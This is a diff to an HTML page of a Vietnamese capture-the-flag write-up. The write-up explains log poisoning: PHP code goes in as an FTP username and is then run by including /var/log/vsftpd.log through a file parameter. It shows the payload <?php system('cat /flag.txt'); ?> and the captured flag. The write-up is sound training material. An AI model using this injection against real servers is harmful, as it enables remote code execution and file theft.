@@ -151,8 +151,8 @@ Kết hợp với hint <code>FTP</code> mình gởi query như sau:</p>
 <pre tabindex="0"><code>host = ctf.ritsec.club:2121
 username = &lt;?php echo &#34;hello&#34;; ?&gt;
 password = d4rkmod3ontheland
-</code></pre><p>Query đến <code>?file=/var/log/vsftpd.log</code> và ta có được chữ <code>hello</code> thay vì <code>?file=/var/log/vsftpd.log</code></p>
-<p>Kết luận, command injection via username.</p>
+</code></pre><p>Query đến <code>?file=/var/log/vsftpd.log</code> và ta có được chữ <code>hello</code> thay vì <code>&lt;?php echo &quot;hello&quot;; ?&gt;</code></p>
+<p>Kết luận, <code>LFI log poisioning</code>.</p>
 <p>Login với username là <code>&lt;?php system('cat /flag.txt'); ?&gt;</code>, mình có được flag:</p>
 <p><code>RS{B1NGU5_FL4G}</code></p>
 
